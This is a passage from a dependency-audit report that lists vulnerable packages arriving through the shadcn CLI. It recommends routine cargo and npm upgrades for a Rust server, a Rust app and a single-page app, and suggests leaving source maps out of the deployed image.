5.0.6 (6), `js-yaml` 4.2.0 (3), `browserslist` 4.28.2 (2), `postcss-selector-parser` 7.1.1 (2),
`baseline-browser-mapping`. All of these come from the **`shadcn` CLI** (a component generator,
which pulls in an MCP server, express and hono). None runs in production or in the build; they
only matter if someone runs `shadcn` (or its MCP mode) on a developer machine.

Recommended upgrades (no code changes were made):
1. Server: `cargo update -p rustls-webpki -p webpki-roots@1.0.9 -p ctutils` (patch-level),
   rebuild the image. Small, worthwhile: these are the only advisories on a production network path.
2. App: `cargo update -p rustls-webpki -p webpki-root-certs -p tokio` now; plan `zip` 6 -> 9
   (not reachable today, but three advisories against `extract` make it easy for a future change
   to become vulnerable).
3. SPA: bump `better-auth` to >= 1.6.22 (client parity and a clean audit), and refresh the
   lockfile for `nanoid` >= 5.1.16, `vite` >= 8.1.6, `vitest` >= 4.1.12, `postcss` >= 8.5.23.
   Move `shadcn` out of the project's devDependencies (run it with `pnpm dlx` when needed), which
   removes most of the 59 entries that appear only in the full tree, the critical one included.
4. Also: `server/web/dist/assets/*.js.map` source maps are built next to the bundle. If they are
   served publicly they reveal no secrets (the code is AGPL and public anyway), but they can be left
   out of the image.
